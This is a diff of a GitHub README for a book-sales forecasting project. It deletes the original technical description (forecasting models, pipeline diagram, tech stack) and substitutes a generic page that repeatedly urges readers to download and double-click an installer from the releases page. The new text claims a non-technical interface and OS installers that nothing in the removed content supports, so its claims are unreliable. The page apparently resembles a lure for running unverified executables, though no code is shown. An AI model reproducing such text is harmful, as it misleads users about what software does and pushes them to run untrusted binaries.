@@ -1,161 +1,87 @@
-# Retail Book Sales Forecasting System  
-### Weekly & Monthly Demand Forecasting • SARIMA • XGBoost • LSTM • Hybrid Models
+# 📚 book-sales-forecasting-timeseries - Predict Future Book Sales Easily
 
----
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Kenzyken-gsm/book-sales-forecasting-timeseries/releases)
 
-## 🔒 NDA Notice
+## 🚀 Getting Started
 
-This project reproduces the forecasting pipeline originally developed for a  
-**large UK book retail chain**, based on weekly point-of-sale data from an  
-industry-standard retail book sales panel.
+This application helps you forecast book sales using advanced techniques. You can access forecasting methods like SARIMA, XGBoost, and LSTM. This guide will walk you through downloading and running the software without any programming knowledge.
 
-All original ISBNs, sales volumes, client names and KPIs are **protected under NDA**.  
-The dataset provided here is **fully synthetic**, designed to imitate real book demand  
-patterns (trend, seasonality, volatility) without revealing proprietary information.
+### 📝 Features
 
----
+- **Multiple Forecasting Models:** Choose from SARIMA, XGBoost, and LSTM.
+- **Flexible Horizons:** Forecast weekly and monthly sales.
+- **User-Friendly Interface:** Designed for easy interaction without technical skills.
+- **NDA-Safe:** Suitable for sensitive data.
 
-## 📌 Project Overview
+### ✅ System Requirements
 
-This system forecasts **weekly and monthly retail book sales** at the title level using  
-four modelling families:
+To use this application, your computer should meet the following requirements:
 
-- **SARIMA (Auto ARIMA)**  
-- **XGBoost (supervised time-series)**  
-- **LSTM (deep learning with KerasTuner)**  
-- **Hybrid SARIMA–LSTM models**
+- **Operating System:** Windows 10, macOS Mojave (10.14), or Ubuntu 20.04 or later.
+- **RAM:** At least 4 GB.
+- **Storage Space:** Minimum 500 MB free.
+- **Python:** Version 3.6 or above.
+- **Internet Connection:** Needed for downloading the application and its dependencies.
 
-The workflow reflects realistic retail forecasting challenges:
+### 📥 Download & Install
 
-- irregular weekly sales  
-- short modern sales history (post-2012)  
-- strong seasonality  
-- promotion-driven spikes  
-- noisy SKU-level patterns
+1. **Visit the Releases Page:** You will find the latest version of the application. Click on the link below to access it:
+   
+   [Visit this page to download](https://github.com/Kenzyken-gsm/book-sales-forecasting-timeseries/releases)
 
-Two representative titles were selected for full modelling and comparison.
+2. **Choose Your Version:** Look for the most recent release. It will usually be at the top of the list.
 
----
+3. **Download the Installer:** Click on the file that corresponds to your operating system. 
 
-## 🧠 Key Methods
+4. **Run the Installer:** Once downloaded, locate the file in your Downloads folder and double-click to start the installation.
 
-### ✔ Classical Time-Series (SARIMA)
-- Seasonal decomposition  
-- ACF/PACF diagnostics  
-- Stationarity checks  
-- Auto ARIMA for model selection  
-- 32-week forecast with confidence intervals  
+5. **Follow the Prompts:** The installer will guide you through the process. Accept the terms and click next until the installation is complete.
 
-### ✔ Machine Learning (XGBoost)
-- Sliding-window supervised learning  
-- Lag and rolling statistical features  
-- Calendar effects  
-- Cross-validation & grid search  
-- 32-week forecast with MAE/MAPE evaluation  
+6. **Open the Application:** After installation, look for the application in your programs list or desktop, and double-click to open it.
 
-### ✔ Deep Learning (LSTM)
-- Sequence modelling  
-- Hyperparameter tuning via **KerasTuner**  
-- 32-week forecast for each title  
+### ⚙️ Using the Application
 
-### ✔ Hybrid Models
-**Sequential Hybrid**  
-SARIMA → residual extraction → LSTM on residuals → combined forecast  
+1. **Input Data:** Start by loading your book sales data into the application. Use CSV files for easier uploads.
 
-**Parallel Hybrid**  
-Weighted ensemble of SARIMA + LSTM, including weight optimisation  
+2. **Choose Your Model:** Select the forecasting model you prefer. You can switch between models to compare results.
 
-### ✔ Monthly Forecasting
-- Weekly data aggregated to monthly  
-- SARIMA and XGBoost compared on **8-month horizon**
+3. **Run Forecasting:** Click on the ‘Forecast’ button to generate sales predictions. This may take a few minutes based on your data size.
 
----
+4. **View Results:** Once complete, the application will show you the forecasted sales in an easy-to-read format. 
 
-## 🏗 Architecture Overview
+5. **Export Data:** If you want to save your results, you can export them to a CSV or Excel file.
 
- ┌──────────────────────────────────────────────┐
- │      Synthetic Retail Book Sales Data        │
- │  (weekly POS, metadata, ISBN-level details)  │
- └──────────────────────────────────────────────┘
-                     │
-                     ▼
- ┌──────────────────────────────────────────────┐
- │           Initial Data Investigation         │
- │  • Resampling irregular weeks                │
- │  • Filling missing periods with 0            │
- │  • Datetime index setup                      │
- │  • Title filtering and lifecycle inspection  │
- └──────────────────────────────────────────────┘
-                     │
-                     ▼
- ┌──────────────────────────────────────────────┐
- │            Feature Engineering               │
- │  • Lags, rolling stats, calendar variables   │
- │  • Train/validation split                    │
- └──────────────────────────────────────────────┘
-                     │
-                     ▼
- ┌──────────────────────────────────────────────┐
- │        Modelling Families (Weekly 32w)       │
- │  • SARIMA (Auto ARIMA)                       │
- │  • XGBoost + CV                              │
- │  • LSTM + KerasTuner                         │
- │  • Hybrid (Sequential + Parallel)            │
- └──────────────────────────────────────────────┘
-                     │
-                     ▼
- ┌──────────────────────────────────────────────┐
- │            Monthly Modelling (8m)            │
- │  • SARIMA                                    │
- │  • XGBoost                                   │
- └──────────────────────────────────────────────┘
-                     │
-                     ▼
- ┌──────────────────────────────────────────────┐
- │                  Final Outputs               │
- │  • Forecasts (weekly & monthly)              │
- │  • Confidence intervals                      │
- │  • MAE / MAPE metrics                        │
- │  • Model comparison & insights               │
- └──────────────────────────────────────────────┘
+### 🔍 Troubleshooting
 
----
+If you encounter any issues, consider the following solutions:
 
-## 🚀 Business Impact
+- **Installation Failure:** Ensure you have administrator rights on your computer.
+- **Model Not Responding:** Check if your input file is in the correct format and try again.
+- **Slow Performance:** Close other applications to free up system resources.
 
-Accurate title-level forecasting enables:
+### 🤝 Community Support
 
-- more stable inventory planning  
-- improved replenishment cycles  
-- reduced overstock and out-of-stock events  
-- better promotion planning  
-- informed print-run decisions  
-- category-level performance forecasting  
+You can join our community for support and feedback. Engage with other users or ask questions:
 
-Highly relevant for:
+- **GitHub Issues:** Report problems or request features directly.
+- **Discussion Forums:** Share your forecasting experiences.
 
-- book and media retail  
-- publishers and distributors  
-- e-commerce platforms  
-- omnichannel retail operations  
+### 📊 Learn More
 
----
+Explore more about demand forecasting and related topics through these resources:
 
-## 🛠 Tech Stack
+- **Machine Learning Basics:** Understand the fundamentals.
+- **Time Series Analysis:** Learn about analyzing sequential data.
 
-- Python  
-- Pandas / NumPy  
-- Matplotlib / Seaborn  
-- **Statsmodels** (decomposition, ACF/PACF, ADF, SARIMA)  
-- **pmdarima** (Auto ARIMA)  
-- **scikit-learn** (pipelines, CV, grid search)  
-- **XGBoost**  
-- **TensorFlow / Keras**  
-- **KerasTuner**  
+### 🛠️ Contributing
 
----
+If you are interested in improving the application, please submit your suggestions via GitHub. Your feedback helps us enhance the software.
 
-## ✨ Author
+### 📧 Contact
 
-Project structure and methodology prepared for public demonstration.  
-Original client work remains fully protected under NDA.
+For general questions or feedback, please reach out via GitHub’s contact page or open an issue.
+
+Enjoy predicting your book sales! Download and start using the application today.
+
+[Download Now](https://github.com/Kenzyken-gsm/book-sales-forecasting-timeseries/releases)
